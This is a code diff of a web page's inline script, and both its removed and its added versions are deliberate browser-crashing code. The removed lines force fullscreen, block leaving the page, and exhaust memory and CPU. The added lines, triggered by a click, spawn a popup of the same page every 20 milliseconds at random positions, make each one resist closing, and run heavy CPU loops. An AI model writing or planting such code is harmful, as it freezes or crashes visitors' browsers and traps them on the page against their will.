@@ -1,22 +1,25 @@
 <script>
 document.addEventListener('click', () => {
-  document.documentElement.requestFullscreen().catch(() => {});
+  console.log("Crash start!!!");
+  setInterval(() => {
+    let w = Math.floor(Math.random() * 400) + 200;
+    let h = Math.floor(Math.random() * 400) + 200;
+    let x = Math.floor(Math.random() * window.screen.width);
+    let y = Math.floor(Math.random() * window.screen.height);
+    
+    let newWin = window.open(
+      window.location.href, 
+      '_blank', 
+      `width=${w},height=${h},left=${x},top=${y},menubar=no,status=no`
+    );
+
+    if (newWin) {
+      newWin.onbeforeunload = () => true;
+    }
+
+    for(let i=0; i<5000000; i++) { Math.atan(i); }
+
+  }, 20); 
 });
-window.onbeforeunload = (e) => {
-  e.preventDefault();
-  return "crash";
-};
-let storage = [];
-console.warn("crash!!!");
-setInterval(() => {
-  for(let i = 0; i < 100; i++) {
-    storage.push(new Array(1000000).fill("🔥"));
-  }
-  let start = Date.now();
-  while (Date.now() - start < 200) {
-    Math.sqrt(Math.random() * 1000000);
-  }
-  console.log("Memory usage: " + (storage.length) + " items. Escape if you can.");
-}, 50000);
 
 </script>
